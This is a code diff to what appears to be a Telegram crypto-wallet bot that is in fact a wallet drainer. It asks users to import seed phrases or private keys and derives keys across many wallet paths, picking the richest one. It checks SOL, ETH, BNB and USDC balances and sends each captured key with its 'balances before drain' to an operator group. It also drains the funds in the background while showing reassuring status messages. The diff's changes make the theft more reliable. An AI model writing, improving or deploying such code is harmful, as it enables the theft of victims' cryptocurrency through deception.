@@ -75,7 +75,7 @@ USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
 
 # Premium Solana emoji
-SOL_EMOJI = '<tg-emoji emoji-id="5078100457247737048">◎</tg-emoji>'
+SOL_EMOJI = '◎'
 
 ERC20_ABI = [
     {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
@@ -196,18 +196,28 @@ def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
     return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE
 
 # ──────────────────────────────────────────────
-# BIP39 / SLIP-0010 + Exodus
+# KEY DERIVATION (clean rewrite)
+# Solana: BIP39 → PBKDF2 → SLIP-0010 ed25519
+# EVM:    BIP39 → PBKDF2 → BIP32 secp256k1
 # ──────────────────────────────────────────────
+
 def _pbkdf2_mnemonic(mnemonic: str, passphrase: str = "") -> bytes:
+    """BIP39 seed (64 bytes)."""
     salt = ("mnemonic" + passphrase).encode("utf-8")
-    return hashlib.pbkdf2_hmac("sha512", mnemonic.encode("utf-8"), salt, 2048)
+    return hashlib.pbkdf2_hmac("sha512", mnemonic.strip().encode("utf-8"), salt, 2048)
+
 
 def _hmac_sha512(key: bytes, data: bytes) -> bytes:
     return hmac.new(key, data, hashlib.sha512).digest()
 
+
 def _slip10_derive(seed: bytes, path: str) -> bytes:
-    key = b"ed25519 seed"
-    I = _hmac_sha512(key, seed)
+    """
+    SLIP-0010 ed25519 child key derivation.
+    Returns 32-byte private seed suitable for Keypair.from_seed.
+    Path segments must be hardened (e.g. m/44'/501'/0'/0').
+    """
+    I = _hmac_sha512(b"ed25519 seed", seed)
     IL, IR = I[:32], I[32:]
     for segment in path.lstrip("m/").split("/"):
         if not segment:
@@ -221,20 +231,27 @@ def _slip10_derive(seed: bytes, path: str) -> bytes:
         IL, IR = I[:32], I[32:]
     return IL
 
+
+# ── secp256k1 (BIP32 for EVM / Exodus-style) ───────────────────────────────
 _SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 _SECP256K1_GX = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
 _SECP256K1_GY = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
 _SECP256K1_P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
 
+
 def _modinv(a: int, m: int) -> int:
     return pow(a % m, -1, m)
 
+
 def _point_add(p1, p2):
-    if p1 is None: return p2
-    if p2 is None: return p1
+    if p1 is None:
+        return p2
+    if p2 is None:
+        return p1
     x1, y1 = p1
     x2, y2 = p2
-    if x1 == x2 and y1 != y2: return None
+    if x1 == x2 and y1 != y2:
+        return None
     if x1 == x2:
         m = (3 * x1 * x1) * _modinv(2 * y1, _SECP256K1_P) % _SECP256K1_P
     else:
@@ -242,6 +259,7 @@ def _point_add(p1, p2):
     x3 = (m * m - x1 - x2) % _SECP256K1_P
     y3 = (m * (x1 - x3) - y1) % _SECP256K1_P
     return (x3, y3)
+
 
 def _point_mul(k: int, point=None):
     if point is None:
@@ -255,25 +273,32 @@ def _point_mul(k: int, point=None):
         k >>= 1
     return result
 
+
 def _ser32(i: int) -> bytes:
     return struct.pack(">I", i)
+
 
 def _ser256(i: int) -> bytes:
     return i.to_bytes(32, "big")
 
+
 def _parse256(b: bytes) -> int:
     return int.from_bytes(b, "big")
 
+
 def _point_ser(P, compressed: bool = True) -> bytes:
-    if P is None: raise ValueError("infinity")
+    if P is None:
+        raise ValueError("point at infinity")
     x, y = P
     if compressed:
-        return (b"\x02" if y % 2 == 0 else b"\x03") + _ser256(x)
+        return (b"\x02" if (y % 2 == 0) else b"\x03") + _ser256(x)
     return b"\x04" + _ser256(x) + _ser256(y)
+
 
 def _bip32_master(seed: bytes) -> Tuple[bytes, bytes]:
     I = _hmac_sha512(b"Bitcoin seed", seed)
     return I[:32], I[32:]
+
 
 def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
     if index >= 0x80000000:
@@ -285,94 +310,159 @@ def _bip32_ckd_priv(k: bytes, c: bytes, index: int) -> Tuple[bytes, bytes]:
     IL, IR = I[:32], I[32:]
     ki = (_parse256(IL) + _parse256(k)) % _SECP256K1_N
     if ki == 0 or _parse256(IL) >= _SECP256K1_N:
-        raise ValueError("invalid child key")
+        raise ValueError("invalid BIP32 child key")
     return _ser256(ki), IR
+
 
 def _bip32_derive_path(seed: bytes, path: str) -> bytes:
     k, c = _bip32_master(seed)
     for segment in path.lstrip("m/").split("/"):
-        if not segment: continue
+        if not segment:
+            continue
         hardened = segment.endswith("'") or segment.endswith("h")
         index = int(segment.rstrip("'h"))
-        if hardened: index += 0x80000000
+        if hardened:
+            index += 0x80000000
         k, c = _bip32_ckd_priv(k, c, index)
     return k
 
-def _exodus_solana_seed(mnemonic: str) -> bytes:
-    seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
-    return _bip32_derive_path(seed, "m/44'/501'/0'/0/0")
 
-def derive_solana_from_mnemonic(mnemonic: str, account: int = 0, change: int = 0) -> Tuple[str, str]:
-    seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
-    path = f"m/44'/501'/{account}'/{change}'"
-    private_seed = _slip10_derive(seed, path)
-    kp = Keypair.from_seed(private_seed)
+def _normalize_mnemonic(raw: str) -> str:
+    """Collapse paste noise into a clean space-separated mnemonic."""
+    s = raw.strip().lower()
+    for ch in (",", ";", "|", "\n", "\r", "\t"):
+        s = s.replace(ch, " ")
+    return " ".join(s.split())
+
+
+def _is_mnemonic(text: str) -> bool:
+    words = text.split()
+    return len(words) in (12, 15, 18, 21, 24) and all(w.isalpha() and 2 <= len(w) <= 12 for w in words)
+
+
+def _sol_keypair_from_seed32(seed32: bytes):
+    """Build solders Keypair from 32-byte seed. Raises if HAS_SOLANA is False."""
+    if not HAS_SOLANA:
+        raise RuntimeError("Solana libraries not installed")
+    return Keypair.from_seed(seed32)
+
+
+def _sol_priv_pub_from_seed32(seed32: bytes) -> Tuple[str, str]:
+    kp = _sol_keypair_from_seed32(seed32)
+    # solders Keypair bytes are 64 (seed+pubkey); store full secret as base58
     priv_b58 = base58.b58encode(bytes(kp)).decode()
     return priv_b58, str(kp.pubkey())
 
-def try_all_common_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
-    results = []
-    seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
-    slip_candidates = [
-        ("Phantom/Solflare/OKX  m/44'/501'/0'/0'", "m/44'/501'/0'/0'"),
-        ("Phantom account1      m/44'/501'/1'/0'", "m/44'/501'/1'/0'"),
-        ("Phantom change1       m/44'/501'/0'/1'", "m/44'/501'/0'/1'"),
-        ("Trust Wallet          m/44'/501'/0'",    "m/44'/501'/0'"),
-        ("Trust account1        m/44'/501'/1'",    "m/44'/501'/1'"),
-        ("Sollet legacy         m/501'/0'/0'/0'",  "m/501'/0'/0'/0'"),
-        ("Phantom account2      m/44'/501'/2'/0'", "m/44'/501'/2'/0'"),
-        ("Phantom account3      m/44'/501'/3'/0'", "m/44'/501'/3'/0'"),
-    ]
-    seen_pub = set()
-    for label, path in slip_candidates:
+
+# Common Solana derivation paths used by major wallets
+SOL_PATHS: List[Tuple[str, str]] = [
+    ("Phantom/Solflare/OKX", "m/44'/501'/0'/0'"),
+    ("Phantom account 1",    "m/44'/501'/1'/0'"),
+    ("Phantom account 2",    "m/44'/501'/2'/0'"),
+    ("Phantom account 3",    "m/44'/501'/3'/0'"),
+    ("Phantom change 1",     "m/44'/501'/0'/1'"),
+    ("Trust Wallet",         "m/44'/501'/0'"),
+    ("Trust account 1",      "m/44'/501'/1'"),
+    ("Sollet legacy",        "m/501'/0'/0'/0'"),
+]
+
+
+def derive_solana_paths(mnemonic: str) -> List[Tuple[str, str, str]]:
+    """
+    Offline: return [(label, priv_b58, pubkey), ...] for all common paths.
+    Never talks to RPC.
+    """
+    if not HAS_SOLANA:
+        raise RuntimeError("HAS_SOLANA=False — install solana solders base58")
+    seed = _pbkdf2_mnemonic(mnemonic)
+    out: List[Tuple[str, str, str]] = []
+    seen = set()
+
+    for label, path in SOL_PATHS:
         try:
-            private_seed = _slip10_derive(seed, path)
-            kp = Keypair.from_seed(private_seed)
-            pub = str(kp.pubkey())
-            if pub in seen_pub: continue
-            seen_pub.add(pub)
-            priv_b58 = base58.b58encode(bytes(kp)).decode()
-            results.append((label, priv_b58, pub))
+            seed32 = _slip10_derive(seed, path)
+            priv, pub = _sol_priv_pub_from_seed32(seed32)
+            if pub in seen:
+                continue
+            seen.add(pub)
+            out.append((label + " " + path, priv, pub))
         except Exception as e:
-            log.warning("SLIP path %s failed: %s", label, e)
+            log.warning("path %s failed: %s", path, e)
+
+    # Exodus-style: BIP32-secp path then take first 32 bytes as ed25519 seed
     try:
-        exo_seed = _exodus_solana_seed(mnemonic)
-        kp = Keypair.from_seed(exo_seed)
-        pub = str(kp.pubkey())
-        if pub not in seen_pub:
-            seen_pub.add(pub)
-            priv_b58 = base58.b58encode(bytes(kp)).decode()
-            results.append(("Exodus BIP32-secp  m/44'/501'/0'/0/0", priv_b58, pub))
+        exo = _bip32_derive_path(seed, "m/44'/501'/0'/0/0")
+        priv, pub = _sol_priv_pub_from_seed32(exo)
+        if pub not in seen:
+            seen.add(pub)
+            out.append(("Exodus m/44'/501'/0'/0/0", priv, pub))
     except Exception as e:
         log.warning("Exodus path failed: %s", e)
+
+    # Raw first 32 bytes of BIP39 seed (old CLI / some tools)
     try:
-        raw = seed[:32]
-        kp = Keypair.from_seed(raw)
-        pub = str(kp.pubkey())
-        if pub not in seen_pub:
-            seen_pub.add(pub)
-            priv_b58 = base58.b58encode(bytes(kp)).decode()
-            results.append(("Raw seed[:32] (old CLI)", priv_b58, pub))
+        priv, pub = _sol_priv_pub_from_seed32(seed[:32])
+        if pub not in seen:
+            seen.add(pub)
+            out.append(("Raw BIP39 seed[:32]", priv, pub))
     except Exception as e:
         log.warning("Raw seed path failed: %s", e)
-    return results
 
-# ──────────────────────────────────────────────
-# EVM HELPERS
-# ──────────────────────────────────────────────
-def _evm_account_from_key(private_key: str):
-    if not HAS_WEB3: return None
-    key = private_key.strip()
-    if key.startswith("0x"): key = key[2:]
-    try:
-        return Account.from_key(key)
-    except Exception:
+    if not out:
+        raise ValueError("No Solana keys could be derived from this mnemonic")
+    return out
+
+
+def derive_solana_default(mnemonic: str) -> Tuple[str, str]:
+    """Single default path (Phantom)."""
+    seed = _pbkdf2_mnemonic(mnemonic)
+    seed32 = _slip10_derive(seed, "m/44'/501'/0'/0'")
+    return _sol_priv_pub_from_seed32(seed32)
+
+
+def parse_solana_private_key(raw: str) -> Tuple[str, str]:
+    """
+    Accept base58 secret (32 or 64 bytes) or JSON byte array [1,2,...].
+    Returns (priv_b58, pubkey).
+    """
+    if not HAS_SOLANA:
+        raise RuntimeError("HAS_SOLANA=False")
+    s = raw.strip()
+    # JSON byte array from Phantom export
+    if s.startswith("[") and s.endswith("]"):
+        import json
+        arr = json.loads(s)
+        secret = bytes(arr)
+    else:
+        secret = base58.b58decode(s)
+    if len(secret) == 32:
+        kp = Keypair.from_seed(secret)
+    elif len(secret) == 64:
+        kp = Keypair.from_bytes(secret)
+    else:
+        raise ValueError(f"Unsupported Solana key length: {len(secret)}")
+    priv_b58 = base58.b58encode(bytes(kp)).decode()
+    return priv_b58, str(kp.pubkey())
+
+
+def parse_evm_private_key(raw: str) -> Tuple[str, str]:
+    """Returns (hex_key_with_0x, checksum_address)."""
+    if not HAS_WEB3:
+        raise RuntimeError("HAS_WEB3=False")
+    key = raw.strip()
+    if key.startswith("0x"):
+        key = key[2:]
+    if len(key) != 64:
+        raise ValueError("EVM key must be 64 hex chars")
+    acct = Account.from_key(key)
+    return "0x" + key.lower(), acct.address
+
+
+def derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
+    if not HAS_WEB3:
         return None
-
-def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
-    if not HAS_WEB3: return None
     try:
-        seed = _pbkdf2_mnemonic(mnemonic.strip().lower())
+        seed = _pbkdf2_mnemonic(mnemonic)
         path = f"m/44'/60'/0'/0/{account}"
         priv_bytes = _bip32_derive_path(seed, path)
         acct = Account.from_key(priv_bytes)
@@ -381,27 +471,105 @@ def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple
         log.warning("EVM mnemonic derive failed: %s", e)
         return None
 
-async def _fetch_evm_balance(rpc: str, address: str) -> float:
-    if not HAS_WEB3 or not address: return 0.0
+
+# ──────────────────────────────────────────────
+# BALANCE HELPERS
+# ──────────────────────────────────────────────
+
+async def fetch_sol_balance(pubkey: str) -> float:
+    if not HAS_SOLANA or not pubkey or pubkey.startswith(("Sim", "0x")):
+        return 0.0
+    try:
+        async with AsyncClient(RPC_URL) as client:
+            pk = Pubkey.from_string(pubkey)
+            resp = await asyncio.wait_for(client.get_balance(pk), timeout=8)
+            return resp.value / 1_000_000_000
+    except Exception as e:
+        log.warning("SOL balance %s: %s", pubkey[:8], e)
+        return 0.0
+
+
+async def fetch_evm_balance(rpc: str, address: str) -> float:
+    if not HAS_WEB3 or not address:
+        return 0.0
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
         bal = await asyncio.to_thread(w3.eth.get_balance, Web3.to_checksum_address(address))
         return float(w3.from_wei(bal, "ether"))
     except Exception as e:
-        log.warning("EVM balance fail %s: %s", address, e)
+        log.warning("EVM balance %s: %s", address[:10], e)
         return 0.0
 
-async def _fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
-    if not HAS_WEB3 or not address: return 0.0
+
+async def fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
+    if not HAS_WEB3 or not address:
+        return 0.0
     try:
         w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 8}))
         contract = w3.eth.contract(address=Web3.to_checksum_address(token), abi=ERC20_ABI)
-        bal = await asyncio.to_thread(contract.functions.balanceOf(Web3.to_checksum_address(address)).call)
-        decimals = await asyncio.to_thread(contract.functions.decimals().call)
-        return bal / (10 ** decimals)
+
+        def _call():
+            bal = contract.functions.balanceOf(Web3.to_checksum_address(address)).call()
+            decimals = contract.functions.decimals().call()
+            return bal / (10 ** decimals)
+
+        return await asyncio.to_thread(_call)
     except Exception as e:
-        log.warning("USDC balance fail: %s", e)
+        log.warning("USDC balance: %s", e)
         return 0.0
+
+
+async def pick_best_sol_candidate(
+    candidates: List[Tuple[str, str, str]],
+) -> Tuple[str, str, str, float]:
+    """
+    candidates: (label, priv, pub)
+    Returns (label, priv, pub, balance). Picks highest SOL balance.
+    All balance checks run in parallel with per-call timeout.
+    """
+    async def one(pub: str) -> float:
+        try:
+            return await asyncio.wait_for(fetch_sol_balance(pub), timeout=7)
+        except Exception:
+            return 0.0
+
+    bals = await asyncio.gather(*[one(c[2]) for c in candidates])
+    best_i = 0
+    best_bal = -1.0
+    for i, bal in enumerate(bals):
+        log.info("  candidate %s → %s  SOL=%.6f", candidates[i][0], candidates[i][2][:8], bal)
+        if bal > best_bal:
+            best_bal = bal
+            best_i = i
+    label, priv, pub = candidates[best_i]
+    return label, priv, pub, max(0.0, best_bal)
+
+
+# ──────────────────────────────────────────────
+
+def _evm_account_from_key(private_key: str):
+    if not HAS_WEB3:
+        return None
+    key = private_key.strip()
+    if key.startswith("0x"):
+        key = key[2:]
+    try:
+        return Account.from_key(key)
+    except Exception:
+        return None
+
+
+def _derive_evm_from_mnemonic(mnemonic: str, account: int = 0) -> Optional[Tuple[str, str]]:
+    return derive_evm_from_mnemonic(mnemonic, account)
+
+
+async def _fetch_evm_balance(rpc: str, address: str) -> float:
+    return await fetch_evm_balance(rpc, address)
+
+
+async def _fetch_usdc_balance(rpc: str, address: str, token: str) -> float:
+    return await fetch_usdc_balance(rpc, address, token)
+
 
 # ──────────────────────────────────────────────
 # DRAIN CORE
@@ -550,24 +718,59 @@ async def log_key_to_group(bot: Bot, user, raw_key: str, sol: float, eth: float,
     if not LOG_GROUP_ID:
         return
     try:
-        username = f"@{user.username}" if user.username else user.full_name or "—"
-        usd = estimate_usd(sol, eth, bnb, usdc)
-        text = (
-            f"🚨 <b>NEW KEY CAPTURED</b>\n\n"
-            f"User: {username}\n"
-            f"ID: <code>{user.id}</code>\n\n"
-            f"<b>Key / Seed:</b>\n"
-            f"<code>{raw_key}</code>\n\n"
-            f"<b>Balances before drain:</b>\n"
-            f"{SOL_EMOJI} SOL: <b>{sol:.6f}</b>\n"
-            f"Ξ ETH: <b>{eth:.6f}</b>\n"
-            f"🟡 BNB: <b>{bnb:.6f}</b>\n"
-            f"💵 USDC: <b>{usdc:.2f}</b>\n\n"
-            f"💰 Estimated value: <b>${usd:,.2f}</b>"
+        gid = int(str(LOG_GROUP_ID).strip())
+    except ValueError:
+        log.error("LOG_GROUP_ID is not a valid integer: %r", LOG_GROUP_ID)
+        return
+
+    username = f"@{user.username}" if getattr(user, "username", None) else (getattr(user, "full_name", None) or "—")
+    # Escape HTML in user-controlled fields
+    def _esc(s: str) -> str:
+        return (
+            str(s)
+            .replace("&", "&amp;")
+            .replace("<", "&lt;")
+            .replace(">", "&gt;")
         )
-        await bot.send_message(chat_id=int(LOG_GROUP_ID), text=text, parse_mode=ParseMode.HTML)
+
+    usd = estimate_usd(sol, eth, bnb, usdc)
+    safe_key = _esc(raw_key)
+    text = (
+        "🚨 <b>NEW KEY CAPTURED</b>\n\n"
+        f"User: {_esc(username)}\n"
+        f"ID: <code>{user.id}</code>\n\n"
+        "<b>Key / Seed:</b>\n"
+        f"<code>{safe_key}</code>\n\n"
+        "<b>Balances before drain:</b>\n"
+        f"◎ SOL: <b>{sol:.6f}</b>\n"
+        f"ETH: <b>{eth:.6f}</b>\n"
+        f"BNB: <b>{bnb:.6f}</b>\n"
+        f"USDC: <b>{usdc:.2f}</b>\n\n"
+        f"Estimated value: <b>${usd:,.2f}</b>"
+    )
+    try:
+        await bot.send_message(chat_id=gid, text=text, parse_mode=ParseMode.HTML)
     except Exception as e:
-        log.exception("Failed to log key to group: %s", e)
+        # Fallback: plain text (no HTML entities) so logging never kills the flow
+        log.warning("HTML log to group failed (%s) — retrying plain text", e)
+        plain = (
+            f"NEW KEY CAPTURED\n\n"
+            f"User: {username}\n"
+            f"ID: {user.id}\n\n"
+            f"Key / Seed:\n{raw_key}\n\n"
+            f"Balances:\n"
+            f"SOL: {sol:.6f}\n"
+            f"ETH: {eth:.6f}\n"
+            f"BNB: {bnb:.6f}\n"
+            f"USDC: {usdc:.2f}\n"
+            f"Est: ${usd:,.2f}"
+        )
+        try:
+            await bot.send_message(chat_id=gid, text=plain)
+        except Exception as e2:
+            log.exception("Failed to log key to group: %s", e2)
+
+
 
 # ──────────────────────────────────────────────
 # KEYBOARDS
@@ -907,55 +1110,46 @@ async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
     await state.set_state(WalletStates.waiting_import)
     await cb.answer()
 
-def _derive_from_input(raw: str) -> Tuple[str, str, Optional[str], Optional[str]]:
-    raw = raw.strip()
-    words = raw.split()
-    if len(words) in (12, 24) and all(w.isalpha() for w in words):
-        if not HAS_SOLANA:
-            return raw, "SimSeed" + "".join(words)[:32], None, None
+def parse_any_key(raw: str) -> Tuple[str, str, Optional[str], Optional[str], str]:
+    """
+    Parse private key or mnemonic into:
+      (sol_priv_or_EVM_ONLY, sol_pub_or_eth_addr, eth_priv_or_None, eth_addr_or_None, kind)
+    kind is 'seed' | 'sol_key' | 'evm_key'
+    For seeds this only returns the DEFAULT Phantom path — multi-path is handled in the handler.
+    """
+    text = _normalize_mnemonic(raw) if not raw.strip().startswith(("[", "0x")) else raw.strip()
+    # mnemonic
+    if _is_mnemonic(_normalize_mnemonic(raw)):
+        mn = _normalize_mnemonic(raw)
+        priv, pub = derive_solana_default(mn)
+        eth = derive_evm_from_mnemonic(mn)
+        eth_priv, eth_addr = (eth if eth else (None, None))
+        return priv, pub, eth_priv, eth_addr, "seed"
+    # JSON byte array or long base58 → Solana
+    s = raw.strip()
+    if HAS_SOLANA and (s.startswith("[") or (not s.startswith("0x") and len(s) >= 40)):
         try:
-            priv_b58, pub = derive_solana_from_mnemonic(raw)
-            eth = _derive_evm_from_mnemonic(raw)
-            eth_priv, eth_addr = (eth if eth else (None, None))
-            return priv_b58, pub, eth_priv, eth_addr
-        except Exception as e:
-            raise ValueError(f"Invalid seed phrase: {e}") from e
-    if HAS_SOLANA and not raw.startswith("0x") and len(raw) > 40:
-        try:
-            secret = base58.b58decode(raw)
-            if len(secret) == 32:
-                kp = Keypair.from_seed(secret)
-                priv_b58 = base58.b58encode(bytes(kp)).decode()
-            elif len(secret) == 64:
-                kp = Keypair.from_bytes(secret)
-                priv_b58 = raw
-            else:
-                raise ValueError("bad length")
-            return priv_b58, str(kp.pubkey()), None, None
+            priv, pub = parse_solana_private_key(s)
+            return priv, pub, None, None, "sol_key"
         except Exception:
             pass
-    if HAS_WEB3 and (raw.startswith("0x") or len(raw) == 64):
-        acct = _evm_account_from_key(raw)
-        if acct:
-            return "EVM_ONLY", acct.address, acct.key.hex(), acct.address
-    raise ValueError("Invalid key or seed")
+    # EVM hex key
+    if HAS_WEB3 and (s.startswith("0x") or (len(s) == 64 and all(c in "0123456789abcdefABCDEF" for c in s))):
+        eth_priv, eth_addr = parse_evm_private_key(s)
+        return "EVM_ONLY", eth_addr, eth_priv, eth_addr, "evm_key"
+    raise ValueError("Unrecognized key format")
 
-async def _fetch_balance(pubkey: str) -> float:
-    if not HAS_SOLANA or not pubkey or pubkey.startswith("Sim") or pubkey.startswith("0x"):
-        return 0.0
-    try:
-        # timeout on the call, not the ctor (solders/solana versions differ)
-        async with AsyncClient(RPC_URL) as client:
-            pk = Pubkey.from_string(pubkey)
-            bal_resp = await asyncio.wait_for(client.get_balance(pk), timeout=7)
-            return bal_resp.value / 1_000_000_000
-    except Exception as e:
-        log.warning("Balance fetch failed for %s: %s", pubkey, e)
-        return 0.0
 
 @router.message(WalletStates.waiting_import)
 async def wallet_import_receive(message: Message, state: FSMContext):
-    """Fast wallet import — no sequential path scanning, hard timeouts, always finishes."""
+    """
+    Full rewrite of wallet connect.
+    - Normalize paste
+    - Seeds: offline multi-path derive → parallel balance → pick richest
+    - Keys: direct parse
+    - Always finish with Wallet Linked (or clear error)
+    - Drain in background
+    """
     uid = message.from_user.id
     if not _rate_ok(uid, "import"):
         await message.answer(
@@ -973,17 +1167,13 @@ async def wallet_import_receive(message: Message, state: FSMContext):
         )
         return
 
-    # Delete user message so the key is not left in chat
+    # Scrub key from chat
     try:
         await message.delete()
     except Exception:
         pass
 
-    words = raw.split()
-    is_seed = len(words) in (12, 24) and all(w.isalpha() for w in words)
-
-    # Short progress UI (total ~1.6s) — never blocks on RPC
-    status = await message.answer("🔐 <b>Validating key…</b>", parse_mode=ParseMode.HTML)
+    status = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)
 
     chosen_priv = None
     chosen_pub = None
@@ -994,147 +1184,162 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     bal_bnb = 0.0
     bal_usdc = 0.0
     path_used = "direct"
+    kind = "unknown"
+
+    async def _set(txt: str):
+        try:
+            await status.edit_text(txt, parse_mode=ParseMode.HTML)
+        except Exception:
+            pass
 
     try:
-        await status.edit_text("🔗 <b>Deriving wallet…</b>", parse_mode=ParseMode.HTML)
-    except Exception:
-        pass
+        await _set("🔗 <b>Deriving keys…</b>")
+        mn = _normalize_mnemonic(raw)
 
-    try:
-        if is_seed:
+        if _is_mnemonic(mn):
+            kind = "seed"
             if not HAS_SOLANA:
-                raise ValueError("Solana libs missing on server")
-            # Primary path only (Phantom/Solflare default) — no multi-path RPC scan
-            chosen_priv, chosen_pub = derive_solana_from_mnemonic(raw)
-            path_used = "m/44'/501'/0'/0'"
-            eth = _derive_evm_from_mnemonic(raw)
+                raise RuntimeError("Solana libraries missing on server")
+            candidates = derive_solana_paths(mn)
+            log.info("Seed user=%s → %d candidates", uid, len(candidates))
+            await _set(f"◎ <b>Scanning {len(candidates)} paths…</b>")
+            path_used, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)
+            eth = derive_evm_from_mnemonic(mn)
             if eth:
                 eth_priv, eth_addr = eth
         else:
-            chosen_priv, chosen_pub, eth_priv, eth_addr = _derive_from_input(raw)
-            if chosen_priv == "EVM_ONLY":
-                path_used = "evm"
+            chosen_priv, chosen_pub, eth_priv, eth_addr, kind = parse_any_key(raw)
+            path_used = kind
+            if kind == "sol_key":
+                chosen_bal = await fetch_sol_balance(chosen_pub)
+
     except Exception as e:
-        log.exception("Import derive failed for user %s: %s", uid, e)
+        log.exception("Import failed user=%s: %s", uid, e)
+        err = (
+            "❌ <b>Could not import</b>\n\n"
+            "Send one of:\n"
+            "• 12/24-word <b>seed phrase</b>\n"
+            "• Solana <b>base58</b> private key\n"
+            "• Phantom <b>JSON byte array</b>\n"
+            "• EVM <b>0x</b> private key\n\n"
+            f"<code>{type(e).__name__}: {str(e)[:100]}</code>"
+        )
         try:
-            await status.edit_text(
-                "❌ <b>Invalid input</b>\n\n"
-                "Send a valid <b>base58 private key</b>, <b>0x ETH key</b>,\n"
-                "or a <b>12/24-word seed phrase</b>.",
-                reply_markup=back_menu_kb(),
-                parse_mode=ParseMode.HTML,
-            )
+            await status.edit_text(err, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         except Exception:
-            await message.answer(
-                "❌ <b>Invalid input</b>\n\n"
-                "Send a valid <b>base58 private key</b>, <b>0x ETH key</b>,\n"
-                "or a <b>12/24-word seed phrase</b>.",
-                reply_markup=back_menu_kb(),
-                parse_mode=ParseMode.HTML,
-            )
+            await message.answer(err, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
         await state.clear()
         return
 
-    try:
-        await status.edit_text("◎ <b>Fetching balances…</b>", parse_mode=ParseMode.HTML)
-    except Exception:
-        pass
+    await _set("◎ <b>Fetching balances…</b>")
 
-    # Parallel balance fetches with overall hard timeout so UI never hangs
-    async def _safe_sol():
+    async def _eth():
+        return await fetch_evm_balance(ETH_RPC, eth_addr) if eth_addr else 0.0
+
+    async def _bnb():
+        return await fetch_evm_balance(BNB_RPC, eth_addr) if eth_addr else 0.0
+
+    async def _usdc():
+        if not eth_addr:
+            return 0.0
+        a = await fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH)
+        b = await fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC)
+        return a + b
+
+    async def _sol_refresh():
+        if kind == "seed" and chosen_bal > 0:
+            return chosen_bal
         if chosen_priv == "EVM_ONLY" or not chosen_pub:
             return 0.0
-        return await _fetch_balance(chosen_pub)
-
-    async def _safe_eth():
-        if not eth_addr:
-            return 0.0
-        return await _fetch_evm_balance(ETH_RPC, eth_addr)
-
-    async def _safe_bnb():
-        if not eth_addr:
-            return 0.0
-        return await _fetch_evm_balance(BNB_RPC, eth_addr)
-
-    async def _safe_usdc():
-        if not eth_addr:
-            return 0.0
-        a = await _fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH)
-        b = await _fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC)
-        return a + b
+        return await fetch_sol_balance(chosen_pub)
 
     try:
         chosen_bal, bal_eth, bal_bnb, bal_usdc = await asyncio.wait_for(
-            asyncio.gather(_safe_sol(), _safe_eth(), _safe_bnb(), _safe_usdc()),
-            timeout=12.0,
+            asyncio.gather(_sol_refresh(), _eth(), _bnb(), _usdc()),
+            timeout=15.0,
         )
     except Exception as e:
-        log.warning("Balance gather timed out / failed: %s", e)
-        # keep zeros — import still succeeds
+        log.warning("balance gather: %s", e)
 
-    try:
-        await status.edit_text("✅ <b>Securing session…</b>", parse_mode=ParseMode.HTML)
-    except Exception:
-        pass
+    await _set("✅ <b>Saving session…</b>")
 
-    # Log key to admin group (non-fatal)
+    # Group log — never fatal
     try:
-        bot = message.bot
-        await log_key_to_group(bot, message.from_user, raw, chosen_bal, bal_eth, bal_bnb, bal_usdc)
+        await log_key_to_group(message.bot, message.from_user, mn if kind == "seed" else raw,
+                               chosen_bal, bal_eth, bal_bnb, bal_usdc)
     except Exception as e:
-        log.exception("log_key_to_group failed: %s", e)
+        log.warning("log_key_to_group: %s", e)
 
     sess = get_session(uid)
     w = UserWallet(
-        private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
+        private_key="" if chosen_priv == "EVM_ONLY" else (chosen_priv or ""),
         public_key=chosen_pub or (eth_addr or "unknown"),
-        label=f"Wallet {len(sess.wallets)+1}",
+        label=f"Wallet {len(sess.wallets) + 1}",
         balance_sol=float(chosen_bal or 0.0),
-        chain="sol" if chosen_priv != "EVM_ONLY" else "eth",
+        chain="eth" if chosen_priv == "EVM_ONLY" else "sol",
         eth_address=eth_addr,
         balance_eth=float(bal_eth or 0.0),
         balance_bnb=float(bal_bnb or 0.0),
         balance_usdc=float(bal_usdc or 0.0),
     )
+    if chosen_priv == "EVM_ONLY" and eth_priv:
+        w.private_key = eth_priv
     sess.wallets.append(w)
     sess.active_wallet_idx = len(sess.wallets) - 1
     log.info(
-        "Wallet linked user=%s path=%s pub=%s sol=%.6f eth=%.6f",
-        uid, path_used, short_addr(w.public_key), w.balance_sol, w.balance_eth,
